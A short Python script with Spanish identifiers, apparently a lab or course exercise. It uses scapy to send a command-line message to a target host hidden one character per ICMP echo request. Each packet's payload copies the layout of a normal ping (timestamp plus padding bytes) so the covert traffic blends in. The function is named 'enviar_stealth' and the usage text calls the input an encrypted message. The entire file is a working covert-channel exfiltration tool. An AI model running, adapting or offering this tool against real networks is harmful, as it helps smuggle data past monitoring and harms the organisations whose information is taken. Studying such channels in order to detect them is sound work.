import sys
import time
import struct
import os
from scapy.all import IP, ICMP, Raw, send, conf

conf.verb = 0 

def construir_data_ping(char: str) -> bytes:
    timestamp = struct.pack("d", time.time())   
    char_byte  = char.encode('latin-1')              
    padding    = bytes(range(0x11, 0x11 + (48 - 9)))  
    return timestamp + char_byte + padding             

def enviar_stealth(mensaje: str, destino: str = "192.168.0.27"):
    icmp_id = os.getpid() & 0xFFFF
    print(f"[*] Destino  : {destino}")
    print(f"[*] Mensaje  : {mensaje!r}  ({len(mensaje)} caracteres → {len(mensaje)} paquetes)")
    print(f"[*] ICMP ID  : {icmp_id:#06x}\n")

    for seq, char in enumerate(mensaje, start=1):
        data   = construir_data_ping(char)
        paquete = IP(dst=destino) / ICMP(type=8, code=0, id=icmp_id, seq=seq) / Raw(load=data)

        send(paquete)
        print(".")
        print("Sent 1 packets.")
        time.sleep(1)

    print(f"\n[+] Transmisión completa — {len(mensaje)} paquetes enviados.")
    print(f"[*] Último carácter transmitido: {mensaje[-1]!r}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Uso: sudo python3 {sys.argv[0]} \"mensaje_cifrado\" [ip_destino]")
        sys.exit(1)

    mensaje = sys.argv[1]
    destino = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
    enviar_stealth(mensaje, destino)